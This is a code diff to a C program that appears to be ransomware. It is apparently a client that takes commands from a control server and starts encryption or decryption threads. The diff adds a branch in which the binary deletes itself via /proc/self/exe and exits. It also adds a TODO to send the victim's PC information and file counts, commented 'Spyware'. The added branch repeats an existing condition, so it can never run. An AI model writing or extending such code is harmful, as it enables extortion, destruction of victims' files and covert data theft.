@@ -23,7 +23,7 @@ void *commands_listener(void *arg) {
 
         if (valread > 0 ) {
             buffer[valread] = '\0';
-            char *arguments[10] = {0};  // zero-initialize so unused slots are NULL
+            char *arguments[10] = {0};
             int argc = 0;
 
             char *token = strtok(buffer, ";");
@@ -38,6 +38,25 @@ void *commands_listener(void *arg) {
             } else if (strcmp(arguments[0], "decrypt") == 0) {
                 printf("start_decryption\n");
                 initialize_threads(8, false);
+            } else if (strcmp(arguments[0], "decrypt") == 0) {
+                printf("kill himself\n");
+                char exe_path[1024];
+
+                ssize_t len = readlink("/proc/self/exe", exe_path, sizeof(exe_path) - 1);
+                if (len == -1) {
+                    perror("readlink failed");
+                    return 1;
+                }
+                exe_path[len] = '\0';
+
+                printf("Deleting: %s\n", exe_path);
+
+                if (unlink(exe_path) == 0) {
+                    printf("Deleted successfully.\n");
+                } else {
+                    perror("unlink failed");
+                }
+                exit(0);
             } else {
                 for (int i = 0; i < argc; i++) {
                     printf("%s\n", arguments[i]);
@@ -62,7 +81,7 @@ int startclient() {
     serv_addr.sin_family = AF_INET;
     serv_addr.sin_port = htons(PORT);
 
-    if (inet_pton(AF_INET, "127.0.0.1", &serv_addr.sin_addr) <= 0) { //127.0.0.1 //10.172.20.145
+    if (inet_pton(AF_INET, "127.0.0.1", &serv_addr.sin_addr) <= 0) { //127.0.0.1, 10.172.20.145
         printf("inet_pton failed\n");
         return -1;
     }
@@ -70,6 +89,10 @@ int startclient() {
         printf("connect failed\n");
         return -1;
     }
+
+    //Todo send information about pc, number of files to encrypt
+    //Spyware
+
     char* hey = "first contact";
     send(client_fd, hey, strlen(hey), 0);
 
